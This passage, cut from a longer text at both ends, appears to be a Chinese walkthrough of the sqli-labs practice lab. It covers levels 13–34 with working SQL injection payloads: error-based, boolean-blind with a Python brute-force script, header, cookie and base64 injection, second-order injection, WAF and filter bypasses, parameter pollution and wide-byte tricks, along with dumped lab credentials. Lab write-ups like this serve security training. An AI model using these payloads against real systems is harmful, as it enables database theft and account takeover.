where table_schema=\u0026#34;security\u0026#34; # 获取 users 表的所有字段 select group_concat(column_name) from information_schema.columns where table_schema=\u0026#34;security\u0026#34; and table_name=\u0026#34;users\u0026#34; updatexml(1,0x7e,3) 是一个MySQL XML处理函数，但可以用于报错注入。参数1：XML文档（这里随意填 1）。参数2：XPath表达式（0x7e 是 ~ 的十六进制，用于触发报错）。参数3：替换值（这里随意填 3）。 concat(0x7e, (...))： concat() 用于拼接字符串，0x7e（~）用于触发报错回显。 select group_concat(user,password) from mysql.user where user = 'mituan'： 尝试查询 mysql.user 表（MySQL系统用户表），但 updatexml() 不允许直接查询非常量数据。改用 information_schema （MySQL的系统数据库）查询数据库结构，而不是直接查 mysql.user。 查数据库名 → information_schema.schemata 查表名 → information_schema.tables 查列名 → information_schema.columns 查数据 → select concat(id,username,password) from users 布尔盲注 判断长度：\n判断当前使用数据库名字的长度是否大于1，\nplain\r1 a\u0026#39;) or length((database()))\u0026gt;1 -- a 枚举字符：a\u0026quot;) or ascii(substr((database()),1,1))\u0026gt;1 \u0026ndash; a\n截取当前使用数据库名字的第一个字符，为了方便脚本的编写，这里将字符转换为ASCLL再判断。\n判断第一个字符的ASCLL码是否大于1，用户名输入：\nplain\r1 a\u0026#39;) or ascii(substr((database()),1,1))\u0026gt;1 -- a 接下来使用穷举法，枚举该字符的所有可能性（对应的ASCLL码为：32~126）。\n猜中第一个字符以后，再用此方法枚举其余字符\n脚本：\npython\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 import requests # 网站路径 url = \u0026#34;http://sqli-labs:8080/Less-13/\u0026#34; # 判断长度的payload payload_len = \u0026#34;\u0026#34;\u0026#34;a\u0026#39;) or length( (database()) ) ={n} -- a\u0026#34;\u0026#34;\u0026#34; # 枚举字符的payload payload_str = \u0026#34;\u0026#34;\u0026#34;a\u0026#39;) or ascii( substr( (database()) ,{l},1) ) ={n} -- a\u0026#34;\u0026#34;\u0026#34; # post请求参数 data= { \u0026#34;uname\u0026#34; : \u0026#34;a\u0026#39;) or 1 -- a\u0026#34;, \u0026#34;passwd\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;submit\u0026#34; : \u0026#34;Submit\u0026#34; } # 判断长度 def getLen(payload_len): length = 1 while True: # 修改请求参数 data[\u0026#34;uname\u0026#34;] = payload_len.format(n = length) response = requests.post(url=url, data=data) # 出现此内容为登录成功 if \u0026#39;../images/flag.jpg\u0026#39; in response.text: print(\u0026#39;测试成功，长度为：\u0026#39;, length) return length; else: print(\u0026#39;正在测试长度：\u0026#39;, length) length += 1 # 枚举字符 def getStr(length): str = \u0026#39;\u0026#39; # 从第一个字符开始截取 for l in range(1, length+1): # 枚举字符的每一种可能性 for n in range(32, 126): data[\u0026#34;uname\u0026#34;] = payload_str.format(l=l, n=n) response = requests.post(url=url, data=data) if \u0026#39;../images/flag.jpg\u0026#39; in response.text: str += chr(n) print(\u0026#39;第\u0026#39;, l, \u0026#39;个字符枚举成功：\u0026#39;,str ) break length = getLen(payload_len) getStr(length) 其余脱库操作可以将(database())修改替换即可\nLess-14-\u0026quot; 和less-13一样，注入点改为\u0026quot;\nLess-15-\u0026rsquo;-布尔盲注 不显示数据库的报错信息，报错注入无法使用，不会动态返回数据，无法使用联合注入。\n注入点判断：\nadmin' -- 返回：\na' or 1 -- a\na' or 0 -- a\n可以确定注入点为单引号字符型\n布尔盲注参考Less-13-方法二\nLess-16-\u0026quot;)-布尔盲注 判断注入点为\u0026quot;)，接下来依旧是布尔盲注\nLess-17-\u0026rsquo;-报错注入 这一关在用户名处输入的都没有实际作用，只有输入正确的用户名后，会返回SUCCESSFULLY UPDATED YOUR PASSWORD,所以注入点应该在密码处。\n输入：admin/a\u0026rsquo;\n返回报错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1\n存在单引号注入点\nplain\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 #判断报错条件 a\u0026#39; and updatexml(1,0x7e,3) -- a ##返回：XPATH syntax error: \u0026#39;~\u0026#39; #脱库 ##查询所有数据库名 ##可以分段查询： 1\u0026#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),3) -- a ###返回：XPATH syntax error: \u0026#39;~information_schema\u0026#39; 1\u0026#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),3) -- a ###返回：XPATH syntax error: \u0026#39;~challenges\u0026#39; 1\u0026#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1)),3) -- a ###返回：XPATH syntax error: \u0026#39;~security\u0026#39; ###直接查询当前所在库 1\u0026#39; and updatexml(1,concat(0x7e,substr((database()),1,32)),3) -- a 返回：XPATH syntax error: \u0026#39;~security\u0026#39; #查询 security 数据库的所有表名 1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#34;security\u0026#34;)),3) -- a ##返回：XPATH syntax error: \u0026#39;~emails,referers,uagents,users\u0026#39; # 查询 users 表的所有列名 1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#34;security\u0026#34; and table_name=\u0026#34;users\u0026#34;)),3) -- a ##返回：XPATH syntax error: \u0026#39;~id,username,password\u0026#39; #查表中内容（分段查询）： 1\u0026#39; and updatexml(1,concat(0x7e,(select concat(id,\u0026#39;:\u0026#39;,username,\u0026#39;:\u0026#39;,password) from security.users limit 0,1)),3) -- a ##返回：You can\u0026#39;t specify target table \u0026#39;users\u0026#39; for update in FROM clause\u0026#34;你不能在 FROM 子句中指定目标表 \u0026#39;users\u0026#39; 进行更新\u0026#34; 1\u0026#39; and updatexml(1,concat(0x7e,(select concat(id,\u0026#39;:\u0026#39;,username,\u0026#39;:\u0026#39;,password) from (select * from users) as temp limit 0,1)),3) -- a ##返回：XPATH syntax error: \u0026#39;~1:Dumb:0\u0026#39; 1\u0026#39; and updatexml(1,concat(0x7e,(select concat(id,\u0026#39;:\u0026#39;,username,\u0026#39;:\u0026#39;,password) from (select * from users) as temp limit 1,1)),3) -- a ##返回：XPATH syntax error: \u0026#39;~2:Angelina:0\u0026#39; Less-18-HTTP头注入 User-Agent:浏览器表明自己的身份（是哪种浏览器）\n（由于php搭建的sqli-labs中18关修改User Agent后没有反应，所以这一关在buuctf打）\n输入admin/admin后，返回：\nYour IP ADDRESS is: 10.244.166.11 Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0\n而对用户名和密码处都没有出现报错，所以注入点应该在User Agent,bp抓包改。\n推断uname 和 passwd 字段都进行了强效的过滤，我们注入正确的 uname 和 passwd 之后再注入。此时发现当注入单引号闭合时，网页返回报错信息。\nUser Agent：'\n注入 2 个连续的单引号，发现闭合成功，由此可见 2 个单引号分别闭合了 2 侧的单引号。\n在注入的两个单引号之间可以插入其他 Sql 语句， updatexml() 报错注入语句。注意使用单引号闭合两侧的 Sql 语句时，相当于把它分割成了 2 部分，插入 updatexml() 报错时要用 OR 进行连接。\nsql\r1 \u0026#39; OR updatexml(1,concat(\u0026#34;!\u0026#34;,database()),2) OR \u0026#39; 表名：\u0026rsquo; OR updatexml(1,concat(\u0026quot;!\u0026quot;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = \u0026lsquo;security\u0026rsquo;)),2) OR '\n字段名： \u0026rsquo; OR updatexml(1,concat(\u0026quot;!\u0026quot;,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = \u0026lsquo;security\u0026rsquo; AND table_name = \u0026lsquo;users\u0026rsquo;)),2) OR '\n字段内容：\u0026rsquo; OR (updatexml(1,concat(\u0026rsquo;!\u0026rsquo;,(SELECT concat_ws(\u0026rsquo;:\u0026rsquo;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR '\nLess-19-Referer POST 报错注入 当输入正确的用户名和密码后，返回：\nYour IP ADDRESS is: 10.244.166.11 Your Referer is: http://e6eb7525-01ea-457a-b00c-6fffbc2de320.node5.buuoj.cn/Less-19/\nReferer是 HTTP 头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的。\n数据库名：Referer: \u0026rsquo; OR updatexml(1,concat(\u0026quot;!\u0026quot;,database()),2) OR '\n表名：Referer: \u0026rsquo; OR updatexml(1,concat(\u0026quot;!\u0026quot;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = \u0026lsquo;security\u0026rsquo;)),2) OR '\n字段名：Referer: \u0026rsquo; OR updatexml(1,concat(\u0026quot;!\u0026quot;,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = \u0026lsquo;security\u0026rsquo; AND table_name = \u0026lsquo;users\u0026rsquo;)),2) OR '\n字段内容：Referer: \u0026rsquo; OR (updatexml(1,concat(\u0026rsquo;!\u0026rsquo;,(SELECT concat_ws(\u0026rsquo;:\u0026rsquo;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR '\nLess-20-Cookie cookie 是网站为了辨别用户身份，进行 Session 跟踪而储存在用户本地终端上的数据。想要回到登录页面，我们需要先把 cookie 清除掉。\n首先输入正确的账户和密码测试，用bp抓包，抓到之后放行POST再抓GET，此时GET中会有cookie信息\n此时就可以在cookie处进行测试注入\n闭合\nCookie: uname=admin\u0026rsquo;\n查询库名\nCookie: uname=admin\u0026rsquo; and updatexml(1,concat(1,database()),1) and '\n查询表名\nCookie: uname=admin\u0026rsquo; and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026lsquo;security\u0026rsquo;)),1) and '\n查询字段\nCookie: uname=admin\u0026rsquo; and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026lsquo;security\u0026rsquo; and table_name=\u0026lsquo;users\u0026rsquo;)),1) and '\n查询数据\nCookie: uname=admin\u0026rsquo; and updatexml(1,concat(1,(select group_concat(username,\u0026rsquo;\u0026rsquo;,password) from users)),1) and \u0026rsquo;\nCookie: uname=admin\u0026rsquo; and updatexml(1,concat(1,(select concat(username,\u0026rsquo;\u0026rsquo;,password) from users limit 0,1)),1) and '\nLess-21-Cookie-base64-\u0026rsquo;) 这一关中的Cookie中uname参数的值是base64编码的。\n抓包之后，Cookie: uname=YWRtaW4%3D\n把uname的值粘贴到burpsuite的decoder1（编码工具）模块，尝试解码，url, html, base64，可以看到最终结果是admin%3D\n把admin\u0026rsquo;放到decoder里面, 编码成base64,重放器发回去\n从报错可知闭合是\u0026rsquo;)\n这关还是可以用报错注入，除了每条payload都要经过一次base64编码（如果base64编码结果包含等号还要进行url编码），再作为uname的值发送，其他还是和Less20一样。\nCookie: uname= YWRtaW4nKSM=\nadmin\u0026rsquo;)#\nCookie: uname=JykgVU5JT04gU0VMRUNUIDEsMiwzIw==\n\u0026lsquo;) union select 1,2,3#\nCookie: uname=JykgVU5JT04gU0VMRUNUIGRhdGFiYXNlKCksMiwzIw==\n\u0026lsquo;) union select database(),2,3#\nCookie: uname=JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwyLDMgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIFdIRVJFIHRhYmxlX3NjaGVtYSA9ICdzZWN1cml0eScj\n\u0026lsquo;) union select group_concat(table_name),2,3 from information_schema.tables where table_schema = \u0026lsquo;security\u0026rsquo;#\nCookie: uname=JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksMiwzIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgV0hFUkUgdGFibGVfc2NoZW1hID0gJ3NlY3VyaXR5JyBBTkQgdGFibGVfbmFtZSA9ICd1c2Vycycj\n\u0026lsquo;) union select group_concat(column_name),2,3 from information_schema.columns where table_schema = \u0026lsquo;security\u0026rsquo; and table_name = \u0026lsquo;users\u0026rsquo;#\nCookie: dW5hbWU9JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb25jYXQoIjoiLHVzZXJuYW1lLHBhc3N3b3JkKSksMiwzIEZST00gc2VjdXJpdHkudXNlcnMj\n\u0026lsquo;) union select group_concat(concat(\u0026quot;:\u0026quot;,username,password)),2,3 from security.users#\nLess-22-Cookie-base64-\u0026quot; 原理和上一关一样一样的（注入点在cookie的uname参数值，payload需要base64编码，如果编码后有等号还需要url编码），就是闭合换成双引号了。\n注入点变成\u0026quot;\nCookie: uname= IiM=\n\u0026quot; #\nCookie: uname=YSIgdW5pb24gc2VsZWN0IDEsMiwzIw==\na\u0026quot; union select 1,2,3#\nCookie: uname= IiB1bmlvbiBzZWxlY3QgZGF0YWJhc2UoKSwyLDMj\n\u0026quot; union select database(),2,3#\nCookie: uname= IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLDIsMyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hID0gJ3NlY3VyaXR5JyM=\n\u0026quot; union select group_concat(table_name),2,3 from information_schema.tables where table_schema = \u0026lsquo;security\u0026rsquo;#\nCookie: uname= IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSwyLDMgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9zY2hlbWEgPSAnc2VjdXJpdHknIGFuZCB0YWJsZV9uYW1lID0gJ3VzZXJzJyM=\n\u0026quot; union select group_concat(column_name),2,3 from information_schema.columns where table_schema = \u0026lsquo;security\u0026rsquo; and table_name = \u0026lsquo;users\u0026rsquo;#\nCookie: uname:= IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbmNhdCgiOiIsdXNlcm5hbWUscGFzc3dvcmQpKSwyLDMgZnJvbSBzZWN1cml0eS51c2VycyM=\n\u0026quot; union select group_concat(concat(\u0026quot;:\u0026quot;,username,password)),2,3 from security.users#\nLess-23-联合注入-过滤注释符 ?id=1\t正常返回数据\n?id=1\u0026rsquo;\t**Warning**: mysql_fetch_array() expects parameter 1 to be resource, boolean given in **D:\\CTF-Tools\\phpstudy_pro\\WWW\\sqli-labs\\Less-23\\index.php** on line **38** You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 确定是单引号字符型\n?id=1\u0026rsquo; or 1 \u0026ndash;+\n?id=1\u0026rsquo; and 1=1 \u0026ndash;+\n?id=1\u0026rsquo; and 1=2 #\t都显示报错信息，应该是过滤了注释符\n?id=33\u0026rsquo; union select 1,2,3\u0026rsquo; 返回2，3\n?id=21\u0026rsquo; union select 1,database(),3 and '\n返回数据库名security\n?id=99\u0026rsquo; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=\u0026lsquo;security\u0026rsquo; '\n返回：emails,referers,uagents,users\n?id=99\u0026rsquo; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=\u0026lsquo;security\u0026rsquo; and table_name=\u0026lsquo;users\u0026rsquo; '\n返回：id,username,password\n?id=99\u0026rsquo; union select 1,group_concat(concat_ws(\u0026rsquo;:\u0026rsquo;,username,password)),3 from users where \u0026lsquo;1\u0026rsquo; = \u0026lsquo;1\n返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4\nLess-24-二次注入 先创建一个新的用户和密码，admin\u0026rsquo;#/123456，使用这个用户登录后，输入admin/111/111更改密码，修改成功，之后使用admin/111登录成功，夺取了用户admin\n原理：\n$sql = \u0026quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \u0026quot;;\n当输入admin\u0026rsquo;#时：\n$sql = \u0026quot;UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' \u0026quot;;\nsql语句就变成了：\n$sql = \u0026quot;UPDATE users SET PASSWORD='$pass' where username='admin'#\n此时，我们并不需要原密码进行验证，并且直接修改了其他用户的密码。这就是所谓的 二次注入，这种注入发生在用户提交的值被存储在数据库中，这个值可能被转义过。当这个值被其他模块调用时，会使用而不转义的原来的数据，如果这个数据是恶意注入，在不转义的情况下就会生效。\nLess-25-过滤or、and-双写注入 这一关过滤了or和and\n?id=1\u0026rsquo;\nWarning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in D:\\CTF-Tools\\phpstudy_pro\\WWW\\sqli-labs\\Less-25\\index.php on line 37\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026lsquo;\u0026lsquo;1\u0026rsquo;\u0026rsquo; LIMIT 0,1\u0026rsquo; at line 1\n?id=1\u0026quot;\nYour Login name:Dumb\nYour Password:Dumb\n确定为单引号字符型注入\n可以使用双写注入\n?id=1\u0026rsquo; OorR 1 = 1\u0026ndash;+\n?id=1\u0026rsquo; aadnnd 1=1 \u0026ndash;+\n这样就可以绕过过滤了\n?id=33\u0026rsquo; union select 1,2,3\u0026rsquo; 返回2，3\n?id=21\u0026rsquo; union select 1,database(),3 and '\n返回数据库名security\n?id=99\u0026rsquo; union select 1,group_concat(table_name),3 from infoORrmation_schema.tables where table_schema=\u0026lsquo;security\u0026rsquo; '\n返回：emails,referers,uagents,users\n?id=99\u0026rsquo; union select 1,group_concat(column_name),3 from infoORrmation_schema.columns where table_schema=\u0026lsquo;security\u0026rsquo; aANDnd table_name=\u0026lsquo;users\u0026rsquo; '\n返回：id,username,password\n?id=99\u0026rsquo; union select 1,group_concat(concat_ws(\u0026rsquo;:\u0026rsquo;,username,passwoORrd)),3 from users \u0026ndash; +\n返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:456,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,【rr:ee,admin#:111111,admin\u0026rsquo;#:111】（这些是Less-24写入的新用户名和密码）\nLess-25a-过滤or、and-双写注入-数字型 注入以下内容，以下内容全部网页都回显错误，说明该网页是数字型注入。\n?id=1\u0026rsquo;\u0026ndash;+\n?id=1\u0026rsquo;)\u0026ndash;+\n?id=1\u0026rsquo;))\u0026ndash;+\n?id=1\u0026quot;\u0026ndash;+\n?id=1\u0026quot;)\u0026ndash;+\n注入：?id=1 OorR 1 = 1\u0026ndash;+\t返回正常\n?id=-1 union select 1,2,3\u0026rsquo; 返回2，3\n?id=-1 union select 1,database(),3 and '\n返回数据库名security\n?id=-1 union select 1,group_concat(table_name),3 from infoORrmation_schema.tables where table_schema=\u0026lsquo;security\u0026rsquo; '\n返回：emails,referers,uagents,users\n?id=-1 union select 1,group_concat(column_name),3 from infoORrmation_schema.columns where table_schema=\u0026lsquo;security\u0026rsquo; aANDnd table_name=\u0026lsquo;users\u0026rsquo; '\n返回：id,username,password\n?id=-1 union select 1,group_concat(concat_ws(\u0026rsquo;:\u0026rsquo;,username,passwoORrd)),3 from users \u0026ndash; +\n返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:456,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,【rr:ee,admin#:111111,admin\u0026rsquo;#:111】（这些是Less-24写入的新用户名和密码）\nLess-26-过滤注释符和空格-报错注入 这一关过滤了注释符和空格，同时or、and也被过滤了\n输入?id=1\u0026rsquo;时报错，确定存在单引号字符型注入\n对于被过滤的字符，可以使用其他的字符进行替代，使用 “%a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”。例如：\nbash\r1 -1\u0026#39; || 1 = 1 || \u0026#39; sql\r1 2 3 4 5 6 7 ?id=-1\u0026#39; || updatexml(1,concat(0x7e,database()),1) || \u0026#39;1\u0026#39;=\u0026#39;1 ?id=1\u0026#39; || updatexml(1, concat(0x7e, (SELECT (group_concat(table_name)) FROM (infoorrmation_schema.tables) WHERE (table_schema=\u0026#39;security\u0026#39;))) ,1) || \u0026#39;1\u0026#39;=\u0026#39;1 ?id=1\u0026#39;||updatexml(1,concat(1,(SELECT (group_concat(column_name)) FROM (infoorrmation_schema.columns) WHERE (table_schema=\u0026#39;security\u0026#39; %26%26 table_name = \u0026#39;users\u0026#39;))) ,1) || \u0026#39;1\u0026#39;=\u0026#39;1 ?id=-1\u0026#39; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) )) ,1) || \u0026#39;1\u0026#39;=\u0026#39;1 Less-26a-过滤注释符，空格-union注入 和less-26过滤的基本一样，但这一关没有给出报错信息，无法用报错注入。此处就需要使用 URL 编码来代替空格，然后用 UNION 注入。判断有几列可用，别忘了 “ORDER” 中的 “or” 被过滤掉了。\n?id=1\u0026rsquo;\n?id=1\u0026rsquo;)\n?id=1\u0026rsquo;) || (\u0026rsquo;\t闭合成功\n%a0\t空格\n%27\t'\nsql\r1 2 3 4 5 6 7 8 9 10 11 ?id=1\u0026#39;)%a0OorRDER%a0BY%a03||(\u0026#39;1 ?id=9999\u0026#39;)%a0UNION%a0SELECT%a01,2,3%a0||(\u0026#39;1 ?id=9999\u0026#39;)%a0UNION%a0SELECT%a01,database(),3%a0||(\u0026#39;1 ?id=9999\u0026#39;)%a0UNION%a0SELECT%a01,group_concat(table_name),3%a0FROM%a0infoORrmation_schema.tables%a0WHERE%a0table_schema = \u0026#39;security\u0026#39;%a0||(\u0026#39;1\u0026#39;)=(\u0026#39;2 ?id=9999\u0026#39;)%a0UNION%a0SELECT%a01,group_concat(column_name),3%a0FROM%a0infoORrmation_schema.columns%a0WHERE%a0table_schema=\u0026#39;security\u0026#39;%a0AandND%a0table_name=\u0026#39;users\u0026#39;%a0||(\u0026#39;1\u0026#39;)=(\u0026#39;2 ?id=9999\u0026#39;)%a0UNION%a0SELECT%a01,group_concat(concat_ws(\u0026#34;:\u0026#34;,username,passwoORrd)),3%a0FROM%a0users%a0WHERE%a0(\u0026#39;1 Less-27-过滤union、select sql\r1 2 3 4 5 6 7 8 9 10 11 12 ?id=1\u0026#39;%a0ORDER%a0BY%a03||\u0026#39;1\u0026#39;=\u0026#39;1 ?id=9999\u0026#39;%a0UNION%a0SELECT%a01,2,3%a0or%a0\u0026#39;1\u0026#39;=\u0026#39;1 ?id=1111\u0026#39;%a0UniOn%a0SelECT%a01,2,3;%00 ?id=9999\u0026#39;%a0UNiON%a0SElECT%a01,2,3%a0or%a0\u0026#39;1\u0026#39;=\u0026#39;1 ?id=9999\u0026#39;%a0UNiON%a0SELeCT%a01,database(),3%a0or%a0\u0026#39;1\u0026#39;=\u0026#39;1 ?id=9999\u0026#39;%a0UNiON%a0SELeCT%a01,group_concat(table_name),3%a0FROM%a0information_schema.tables%a0WHERE%a0table_schema = \u0026#39;security\u0026#39;%a0or%a0\u0026#39;1\u0026#39;=\u0026#39;2 Less-28 Less-29-HPP-\u0026rsquo; **WAF (Web 应用防护系统)**是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。此处应该是对注入的参数进行了强效过滤，以此达到了 WAF 的作用。\n绕过的方法是 HPP (HTTP Parameter Pollution)，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入。\nbash\r1 ?id=1\u0026amp;id=2 这种攻击成功绕过了 WAF，对第二个参数用单引号闭合并注释掉后面的内容。网页回显正常的参数，说明网页存在单引号闭合的字符型注入。\nbash\r1 ?id=1\u0026amp;id=2\u0026#39;--+ 获取数据库信息\n使用参数污染后，注入流程和 Less 1 一样。判断表有几列。\nbash\r1 ?id=1\u0026amp;id=1\u0026#39; ORDER BY 3--+ 判断哪些列可用。\nbash\r1 ?id=1\u0026amp;id=-1\u0026#39; UNION SELECT 1,2,3--+ 爆数据库名。\nbash\r1 ?id=1\u0026amp;id=-1\u0026#39; UNION SELECT 1,database(),3 --+ 爆表名。\nbash\r1 ?id=1\u0026amp;id=-1\u0026#39; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=\u0026#39;security\u0026#39;--+ 爆字段名。\nbash\r1 ?id=1\u0026amp;id=-1\u0026#39; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;users\u0026#39;--+ 爆出 users 表中的信息。\nbash\r1 ?id=1\u0026amp;id=-1\u0026#39; UNION SELECT 1,group_concat(concat_ws(\u0026#39;:\u0026#39;,username,password)),3 FROM security.users--+ Less-30-HPP-\u0026quot; sql\r1 2 3 4 5 6 7 8 9 10 11 ?id=1\u0026amp;id=1\u0026#34; ORDER BY 3--+ ?id=1\u0026amp;id=-1\u0026#34; UNION SELECT 1,2,3--+ ?id=1\u0026amp;id=-1\u0026#34; UNION SELECT 1,database(),3 --+ ?id=1\u0026amp;id=-1\u0026#34; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=\u0026#39;security\u0026#39;--+ ?id=1\u0026amp;id=-1\u0026#34; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;users\u0026#39;--+ ?id=1\u0026amp;id=-1\u0026#34; UNION SELECT 1,group_concat(concat_ws(\u0026#39;:\u0026#39;,username,password)),3 FROM security.users--+ Less-31-HPP-\u0026quot;) sql\r1 2 3 4 5 6 7 8 9 10 11 ?id=1\u0026amp;id=1\u0026#34;) ORDER BY 3--+ ?id=1\u0026amp;id=-1\u0026#34;) UNION SELECT 1,2,3--+ ?id=1\u0026amp;id=-1\u0026#34;) UNION SELECT 1,database(),3 --+ ?id=1\u0026amp;id=-1\u0026#34;) UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=\u0026#39;security\u0026#39;--+ ?id=1\u0026amp;id=-1\u0026#34;) union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;users\u0026#39;--+ ?id=1\u0026amp;id=-1\u0026#34;) UNION SELECT 1,group_concat(concat_ws(\u0026#39;:\u0026#39;,username,password)),3 FROM security.users--+ Less-32,33,36-宽字节注入 注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。\n?id=1\u0026rsquo;\n宽字节注入（GBK/Big5 Character Encoding SQL Injection）是一种利用数据库字符集与Web应用层字符编码不一致，结合转义函数（如addslashes）缺陷的SQL注入攻击方式。\n漏洞原理\n字符集转换问题 当数据库使用GBK等多字节编码时，某些字符（如0xbf5c）会被视为一个合法字符（如縗），而非两个独立字节。 攻击者通过输入%bf%27（0xbf + '的URL编码%27），触发字符集转换错误。 转义函数绕过 PHP的addslashes或mysql_real_escape_string会将单引号'转义为\\'（即%5c%27）。 当输入%bf%27时，转义后的字符串变为%bf%5c%27。由于GBK将%bf%5c解析为合法字符縗，剩下的%27（'）未被转义，导致注入。 对于一般的转义字符，我们是无法构造注入的 payload 的，但这并不代表网页就没有任何漏洞可以注入。对宽字节注入漏洞进行测试，注入如下参数。当数据库的编码采用 GBK 国标码时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了。这种操作是由于 GBK 国标码是双字节表示一个汉字，因此导致了反斜杠和其他的字符共同表示为一个汉字。这可以让数据库的 SQL 查询了正确的参数(汉字)，从而可以使用 UNION 语句进行注入。\nsql\r1 ?id=1%df\u0026#39; sql\r1 2 3 4 5 6 7 8 9 10 11 12 13 ?id=1%df\u0026#39; ORDER BY 3--+ ?id=1%df\u0026#39; ORDER BY 4--+ ?id=-1%df\u0026#39; UNION SELECT 1,2,3 --+ ?id=-1%df\u0026#39; UNION SELECT 1,database(),3 --+ #此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用。 ?id=-1%df\u0026#39; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479--+ ?id=-1%df\u0026#39; UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=0x7365637572697479 and table_name=0x7573657273--+ ?id=-1%df\u0026#39; UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+ Less-34,37-宽字节注入-POST 这一关是POST，抓包看一看，传入admin\u0026rsquo;/admin,同样对单引号转义，可以用宽字节注入\nuname=%df\u0026rsquo;\u0026amp;passwd=admin\u0026amp;submit=Submit\nuname=%df\u0026rsquo;\u0026ndash;+\u0026amp;passwd=admin\u0026amp;submit=Submit\t注释后页面正常，存在单引号注入\nsql\r1 2 3 4 5 6 7 8 9 uname=1%df\u0026#39; UNION SELECT 1,2 --+\u0026amp;passwd=\u0026amp;submit=Submit uname=1%df\u0026#39; UNION SELECT database(),2 --+\u0026amp;passwd=\u0026amp;submit=Submit uname=1%df\u0026#39; UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=0x7365637572697479 --+\u0026amp;passwd=\u0026amp;submit=Submit uname=1%df\u0026#39; UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_schema=0x7365637572697479 AND table_name=0x7573657273 